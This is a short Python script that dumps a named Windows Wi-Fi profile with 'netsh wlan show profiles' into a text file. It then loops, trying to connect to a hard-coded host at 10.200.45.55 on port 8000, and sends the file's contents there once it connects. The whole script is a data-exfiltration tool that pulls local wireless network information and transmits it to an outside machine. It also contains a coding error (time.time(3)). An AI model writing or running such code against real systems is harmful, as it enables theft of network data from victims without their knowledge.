import time
import socket
import os

os.system("netsh wlan show profiles Smartone_Direction > wifi_information.txt")
with open("wifi_information.txt", "r") as file:
    file = file.read()

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        #the client try to connect 
        client.connect(("10.200.45.55", 8000))
    except:
        print("code exited ...")
        time.time(3)
    else:
        client.send(file.encode())
        print("get information finished")
        break
exit()

